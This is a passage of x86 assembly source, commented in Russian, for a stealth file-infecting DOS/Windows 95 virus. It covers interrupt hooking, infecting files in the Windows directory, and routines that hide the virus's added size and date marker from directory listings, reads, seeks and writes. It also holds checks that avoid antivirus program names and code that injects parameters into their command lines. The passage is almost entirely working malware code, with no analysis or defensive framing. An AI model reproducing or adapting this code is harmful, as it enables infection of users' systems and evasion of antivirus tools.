        call    SaveRegs        ; сохранение регистров
        jc      no_dta          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_dta

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        lea     si,[bx+18h]     ; si -> дата файла
        lea     di,[bx+1ah]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_dta:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Win95 stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 infstealth:
        stc                     ; CF должен быть установлен
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; все ok?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,0            ; время в Win95 формате
        mov     si,dx
        lea     di,[si+24h]     ; размер файла
        lea     si,[si+14h]     ; дата файла
        mvs     es,ds
        jmp     allw95

 lfnstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,si           ; формат времени
        lea     si,[di+14h]     ; дата файла
        lea     di,[di+20h]     ; размер файла

 allw95:
        cmp     ax,1            ; проверка формата времени
        jz      dos_date

        push    si di ax        ; сохранение параметров на будующее
        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,0            ; Win95 в формат DOS
        mvs     ds,es           ; SI указывает на дату
        call    int21           ; сейчас CX:DX содержат обычное DOS время
        pop     ax di si        ; восстановление параметров
        mov     [si],cx         ; сохранение параметров в FindDataRecord
        mov     [si+2],dx

 dos_date:
        add     si,2            ; si -> дата файла
        call    sizst           ; di -> длина файла
        sub     si,2

        cmp     ax,1            ; проверка формата времени
        jz      no_win

        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,1            ; DOS в формат Win95
        mov     di,si           ; DI -> buffer для времени и даты
        mov     cx,[di]         ; чтение времени и даты в формате DOS
        mov     dx,[di+2]
        call    int21           ; сейчас ES:[DI] содержит время Win95

 no_win:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DATE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 date_get:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    int21           ; запрос даты
        call    hidestm         ; маскировка даты
        clc
        jmp     seek_ret

 date_set:
        call    OpenSFT         ; открыть SFT
        call    int21           ; установка даты
        call    correctdate     ; правка даты
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; LSEEK stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 seekstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        push    cx              ; сохранение CX
        cmp     al,2            ; проверка типа
        jne     forw
        sub     dx,vsize        ; маскировка настоящего конца файла
        sbb     cx,0            ; сдвиг идет от головы вируса
 forw:  call    int21           ; здесь установка указателя идет от начала
        pop     cx              ; восстановление CX
        jc      seek_ret        ; или от текущей позиции
        call    seekhide        ; блокировка попадания lseek на тело вируса
        mov     ax,cs:seek_pos
        mov     dx,cs:seek_pos+2
        jmp     seek_ret

 no_seek:
        call    int21           ; вызов DOS
 seek_ret:
        call    CloseSFT        ; закрыть SFT
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; READ stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 readstealth:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SeekSave        ; сохранение позиции указателя
        call    int21           ; запрос чтения данных
        jc      seek_ret
        call    SaveRegs        ; сохранение регистров
        mov     di,dx           ; дублирование смещения буфера
        mov     cs:nrbytes,ax   ; количество прочитанных байт

        cmp     D cs:seek_pos,32 ; читают заголовок?
        jae     zone
        call    crload          ; прочитать настоящее начало файла

        lea     si,buffer       ; SI -> настоящее начало
        add     si,cs:seek_pos  ; SI -> с учетем смещения чтения

        mov     cx,cs:nrbytes   ; считаем количество байт которые нам нужно
        add     cx,cs:seek_pos  ; состелсить
        cmp     cx,32           ; позиция конца чтения лежит за пределом
        jbe     $+5             ; сохраненного начала файла?
        mov     cx,32
        sub     cx,cs:seek_pos

        jcxz    zone            ; в случае чтения 0 байт
 rhide: mov     al,cs:[si]      ; подмена инфицированного начала файла на
        mov     [di],al         ; оригинальное
        inc     si
        inc     di
        loop    rhide

 zone:  call    seekhide        ; блокируем возможность попадания lseek на
        call    LoadRegs        ; зону вируса + уменьшения числа прочитанных
        mov     ax,cs:nrbytes   ; байт
        jmp     seek_ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; ALL HANDLER stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 patchsft:
        call    OpenSFT         ; открыть SFT
        jmp     no_seek

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; WRITE stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 diswrite:
        call    OpenSFT         ; открыть SFT
        cmp     cs:stf,0        ; работать можно?
        jnz     no_seek
        call    HandleCheck     ; проверка файла IOCTL
        jc      no_seek
        call    Inf_Check       ; инфицирован?
        jnc     no_seek

        call    SaveRegs        ; сохранение регистров
        call    SeekSave        ; сохранение позиции указателя
        mvs     ds,cs           ; DS=CS

        call    crload          ; загрузка оригинального начала в буфер
        call    seek2bof        ; поместить указатель в начало файла
        mov     cx,32           ; запись оригинального заголовка файла
        lea     dx,buffer
        call    write
        xor     cx,ax           ; ошибка? ну тогда при записи того,
        jnz     disfail         ; чего просят ошибка будет тоже!

        mov     cx,-1           ; двигаемся к голове вируса. т.е.
        mov     dx,-vsize       ; к концу зараженной программы
        call    seekfrom_eof
        mov     ah,40h          ; обрезаем файл
        xor     cx,cx           ; удаляем тело вируса из вирусоносителя
        call    int21
        mov     ah,68h          ; сбрасываем буфера
        call    int21
 disfail:
        call    RestoreSeek     ; восстанавление позиции указателя
        call    LoadRegs        ; восстанавление регистров
        jmp     no_seek         ; выходим

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка инфицированности памяти
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 tsrtest:
        mov     ax,3265h        ; Hi, AX=3265
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; повторный перехват вектора int 21h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 rehook:
        call    SaveRegs        ; сохранение регистров
        call    chk_dup         ; проверка, был ли вектор уже
        jnz     no_hook         ; переустановлен
        call    WinOldAp        ; проверка, что-нибудь изменилось с
        cmp     ax,cs:w95state  ; момента инсталляции вируса в память
        jz      no_hook         ; (была ли загружена Win95)

        mov     ax,3521h        ; получение вектора int 21h
        int     21h
        mov     ax,2521h        ; установка нового вектора прерывания
        lea     dx,manager
        mvs     ds,cs
        int     21h
        call    set_dup         ; сохранение вектора в другой ячейке IVT
 no_hook:
        call    LoadRegs        ; восстановление регистров
        jmp     exithandler

; ════════════════════════> S·U·B·R·O·U·T·I·N·E·S <═════════════════════════
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; заражение некоторых жизненно важных файлов
; использует STACKS в качестве буфера для имен файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 FixVirus:
        call    SaveRegs        ; сохранение регистров
        mov     si,2ch
        mov     ds,cs:[si]      ; загрузка сегмента Environment
        xor     si,si
        mvs     es,cs
        lea     di,windir       ; ES:DI -> WINDIR=
 wdlook4:
        call    compare         ; сравнение элеменита envir с шаблоном
        jz      wdfound
        cmp     w [si],0
        jz      fverror
        inc     si
        jmp     wdlook4
 wdfound:
        add     si,11           ; SI -> директория windows
        lea     di,stacks
        lodsb
        stosb
        or      al,al
        jnz     $-4
        mvs     ds,cs
        lea     bx,[di-1]
        lea     si,fixes

 fvinfect:
        cmp     b [si],0
        jz      fverror
        mov     di,bx
        lodsb
        stosb
        or      al,al
        jnz     $-4

        mov     ax,1857h
        lea     dx,stacks
        int     21h
        jmp     fvinfect

 fverror:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Open/Close SFT - подпрограмма для закрытия/открытия нормальной SFT
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 OpenSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,0            ; "Open"
        jmp     Manipulate

 CloseSFT:
        call    SaveRegs        ; сохранение регистров
        mov     si,1            ; "Close"

 Manipulate:
        mov     bp,bx           ; сохранение handle
        call    HandleCheck     ; проверка, это файл или chardevice
        jc      SFT_Error

        mov     ax,1220h        ; получение JFT для этого файла
        int     2fh
        jc      SFT_Error
        xor     bx,bx
        mov     bl,es:[di]      ; BL = System file entry
        cmp     bl,0ffh
        je      SFT_Error
        mov     ax,1216h        ; получение адреса SFT в ES:DI
        int     2fh
        jc      SFT_Error

        mov     bx,bp           ; восстановление handle
        call    Inf_Check       ; проверка инфицированности файла
        jnc     SFT_Error       ; выход в случае чистого файла

        mov     eax,vsize
        cmp     si,0            ; "Open"?
        jz      open
        neg     eax
 open:  add     es:[di+11h],eax ; сохранение в SFT размера

        mov     dx,es:[di+0fh]  ; получение даты файла
        call    hidestm         ; скрытие лишних 100 лет
        cmp     si,0            ; "Open"?
        jnz     clsft
        ror     dh,1            ; увеличение даты файла
        add     dh,100
        rol     dh,1
 clsft: mov     es:[di+0fh],dx  ; сохранение измененной даты

 SFT_Error:
        call    LoadRegs        ; восстановление регистров
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; проверка активности Win95 (используя WinOldAp)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 WinOldAp:
        mov     ax,1700h        ; функция WinOldAp Installation Check
        int     2fh             ; программа, которая присутствует в Win95
        ret                     ; в 32-разрядном PE режиме

 get_dup:
        push    ds si           ; загрузка регистров ES:BX оригинальным
        mvs     ds,0            ; вектором 21-го прерывания
        mov     si,63h*4
        mov     bx,[si]
        mov     es,[si+2]
        pop     si ds
        ret

 set_dup:
        push    ds si           ; сохранение ES:BX в 63-й векторе
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     [si],bx
        mov     [si+2],es
        pop     si ds
        ret

 chk_dup:
        push    ds si eax       ; проверка изменение 63-го вектора
        mvs     ds,0            ; прерывания
        mov     si,63h*4
        mov     eax,[si]
        cmp     D cs:io21p,eax
        pop     eax si ds
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; size stealth
; ES:SI -> Дата файла
; ES:DI -> Длина файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sizst: mov     dx,es:[si]      ; dx = дата файла
        call    hidestm         ; маскировка и проверка 100 лишних лет
        jnc     oklen           ; файл инфицирован?
        mov     W es:[si],dx    ; установить нормальную дату файла
        sub     W es:[di],vsize ; маскировка приращения длины файла
        sbb     W es:[di+2],0
 oklen: ret

 hidestm:
        push    dx              ; сохранить дату в стеке
        shr     dh,1            ; получить год файла
        cmp     dh,100          ; сравнение его с 100
        pop     dx              ; восстановить дату
        jb      okinf
        ror     dh,1            ; получить год файла
        sub     dh,100          ; спрятать лишнее
        rol     dh,1            ;
        stc                     ; файл заражен!
        ret
 okinf: clc
        ret

 correctdate:
        mov     ax,5700h        ; установка даты файла в зависимости
        call    int21           ; от того, заражен ли он
        call    HideStm         ; нормальная дата
        call    Inf_Check       ; проверить файл на зараженность
        jnc     okdat
        ror     dh,1
        add     dh,100
        rol     dh,1
 okdat: mov     ax,5701h        ; установка откорректированной
        call    int21           ; даты файла
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Проверка имени файла (AVs и цифры)
; Проверка расширения файла (Extens)
; При SAVE_AX=4B00 добавление параметров в cmdline
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Filename:
        call    SaveRegs        ; сохранение регистров
        cld

        mov     si,dx           ; смещение имени в индексный регистр
 nfind: lodsb                   ; поиск имени файла
        cmp     al,':'          ; в нашем случае оно будет следовать
        jz      separ           ; за последним "/", "\", ":"
        cmp     al,'\'
        jz      separ
        cmp     al,'/'
        jnz     store
 separ: mov     dx,si           ; сохранить смещение

 store: or      al,al           ; проверка конца строки (0)
        jnz     nfind

        mov     si,dx           ; SI -> имя файла
        xor     di,di           ; расширение пока не найдено
 gext:  lodsb
        cmp     al,'.'          ; расширение?
        jnz     $+4
        mov     di,si
        or      al,al
        jnz     gext
        or      di,di           ; если точек в имнеи файла
        jz      Bad_File        ; обнаружено не было

        lea     bp,[di-1]       ; сейчас BP-расширение файла, DX-его имя
        mvs     es,cs           ; ES=CS

        cmp     cs:save_ax,4b00h
        jne     no_add
        mov     si,dx           ; SI -> имя файла
        lea     di,prms         ; табличка (формат: avname,0,0,cmdline,0dh)

 scancmd:
        call    compare         ; сравнение имени запускаемой программы
        jz      addprm          ; с предусмотренным именем из таблицы
        mov     al,0dh
        mov     cx,0ffffh
        repne   scasb
        cmp     b cs:[di],0     ; конец таблицы?
        jnz     scancmd         ; в таблице имя не найдено - запущена
        jmp     no_add          ; другая программа

 addprm:
        push    es              ; сохранение ES
        mov     al,0
        mov     cx,0ffffh
        repne   scasb
        lea     si,[di+1]
        les     bx,d cs:save_bx ; загрузка в ES:BX адреса EPB
        les     bx,es:[bx+2]    ; загрузка адреса командной строки в ES:BX
        mov     di,bx
 getdx: inc     di              ; сканируем командную строку
        cmp     b es:[di],0dh   ; конец строки?
        jnz     getdx
        mov     cx,-1           ; счетчик длины дополнительного параметра
        lods    b cs:[si]       ; загрузка байта параметра
        stosb                   ; сохранение байта параметра
        inc     cx              ; увеличение счетчика
        cmp     al,0dh          ; проверка на окончание параметра
        jnz     $-6
        add     es:[bx],cl      ; увеличение длины командной строки
        pop     es              ; восстановление ES

 no_add:
        mov     si,bp
        lea     di,extens       ; ES:DI указывают на таблицу с
        call    compare         ; разрешенными расширениями
        jnz     Bad_File        ; некорректное расширение?

        mov     si,dx           ; SI -> имя файла
        lea     di,AVs          ; ES:DI -> таблица с именами
        call    compare         ; сравнение имен
        jz      Bad_File        ; неХоРошее имя

 digit: lodsb                   ; проверяем, есть ли в имени файла цифры
        cmp     al,'0'
        jb      nodig
        cmp     al,'9'
        jbe     Bad_File
 nodig: or      al,al
        jnz     digit

        call    LoadRegs        ; восстановление регистров
        clc                     ; очистка CF
        ret

 Bad_File:
        call    LoadRegs        ; восстановление регистров
        stc                     ; установка CF
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; установка байта STF в зависимости от текущего PSP/MCB
; байт равен 1 если текущий MCB принадлежит программе из STLOCK
; байт равен 0 если владелец текущего MB не зарегистрирован в STLOCK
; байт COMMAND равен 1 если текущий MB принадлежит command.com'у
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 mcbcheck:
        call    SaveRegs        ; сохранение регистров

        mov     ah,62h          ; запрос сегмента текущего PSP
        call    int21
        dec     bx              ; получение сегмента MCB
        mov     ds,bx           ; DS:SI указывают на владельца MB
        mov     si,08h          ;
        lea     di,stlock       ; ES:DI указывают на наш
        mvs     es,cs           ; список имен STLOCK
        call    compare         ; сравнение данных
        sete    cs:stf          ; установка стелс-флага

        lea     di,comspec      ; проверка владельца текущего
        call    compare         ; блока на command.com
        sete    cs:command
        call    LoadRegs        ; восстановление регистров
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; COMPARE - сравнение данных
; DS:SI - источник
; ES:DI - таблица (Data1,0,Data2,0,...,DataN,0,0)
; Выход: ZF = 1 в случае совпадения данных
; Регистр латинских букв значения не имеет
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 compare:
        call    SaveRegs        ; сохранение регистров
        mov     dx,si           ; дублирование смещения источника

 data1: mov     si,dx           ; восстановление смещения источника
 data2: mov     al,ds:[si]      ; чтения байта источника
        mov     ah,es:[di]      ; чтения байта таблицы
        inc     di              ; увеличение индексных регистров
        inc     si              ;
        call    upreg           ; перевод символов в верхний регистр
        or      ah,ah           ; если в таблице образовался 0 =>
        jz      equal           ; => данные совпали
        cmp     al,ah           ; иначе побайтное сравнение
        jz      data2           ; если байты совпали, проверяем дальше

 data3: cmp     B es:[di],0     ; быйты не совпали, берем следующее
        jz      data4           ; поле
        inc     di
        jmp     data3

 data4: inc     di
        cmp     B es:[di],0     ; проверка на последнюю запись в
        jnz     data1           ; таблице

        call    LoadRegs        ; таблица кончилась: совпадений не найдено
        cmp     di,-1           ; очистка ZF
        ret                     ; выход из подпрограммы

 equal: call    LoadRegs        ; восстановление регистров
        cmp     al,al           ; установка ZF
        ret                     ; выход из подпрограммы

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; сохранение и загрузка регистров из стека
; FLAGS EAX BX CX DX SI DI BP ES DS
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 SaveRegs:
        pushf                   ; сохранение самих регистров
        push    eax bx cx dx si di bp es ds
        mov     bp,sp
        push    w [bp+22]       ; копирование адреса возврата
        mov     bp,[bp+4]       ; восстановление BP
        ret

 LoadRegs:
        mov     bp,sp           ; копирование адреса возврата в пустую
        pop     W [bp+24]       ; ячейку стека (осталась от SaveRegs)
        pop     ds es bp di si dx cx bx eax
        popf
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Gets a random value [0..AL]
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 get_rnd:
        push    bx cx dx si di
        mov     si,ax
        mov     ax,cs:random1
        mov     bx,cs:random2
        mov     cx,ax
        mov     di,8405h
        mul     di
        shl     cx,3
        add     ch,cl
        add     dx,cx
        add     dx,bx
        shl     bx,2
        add     dx,bx
        add     dh,bl
        shl     bx,5
        add     dh,bl
        add     ax,1
        adc     dx,0
        mov     cs:random1,ax
        mov     cs:random2,dx
        or      si,si
        jz      rnd_exit

 rnd_fail:
        sub     ax,si
        jnc     rnd_fail
        add     ax,si
        and     eax,0ffffh
 rnd_exit:
        pop     di si dx cx bx
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для установки/снятия вектора прерывания
; критических ошибок int 24h
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Hook24:
        call    SaveRegs        ; сохранение и перехват
        xor     ax,ax           ; вектора прерывания критических
        mov     ds,ax           ; ошибок int 24h
        mov     si,24h*4
        mov     dx,cs
        lea     ax,int24
        xchg    ax,[si]
        xchg    dx,[si+2]
        mov     cs:io24,ax
        mov     cs:io24+2,dx
        call    LoadRegs
        ret

 Remove24:
        call    SaveRegs        ; восстановление вектора int 24h
        xor     ax,ax
        mov     ds,ax
        mov     si,24h*4
        mov     ax,cs:io24
        mov     dx,cs:io24+2
        mov     [si],ax
        mov     [si+2],dx
        call    LoadRegs
        ret

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; подпрограммы для работы с файлами
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 LFNOpenFile:                   ; LFN открытие файла
        mov     ax,716ch
        mov     si,dx
        mov     dx,1            ; открытие файла
        mov     bx,2            ; вернуть ошибку если не открывается
        call    int21
        xchg    ax,bx
        ret

 OpenFile:                      ; открытие файла
        mov     ax,3d02h
        call    int21
        xchg    ax,bx
        ret

 GetDate:                       ; получение времени и даты
        mov     ax,5700h        ; последней записи в файл
        call    int21
        mov     cs:time,cx
        mov     cs:date,dx
        ret

 RestDate:                      ; восстановление времени и даты
        mov     ax,5701h        ; файла
        mov     cx,cs:time
        mov     dx,cs:date
        call    int21
        ret

 Write: mov     ah,40h          ; запись в файл
        call    int21
        ret

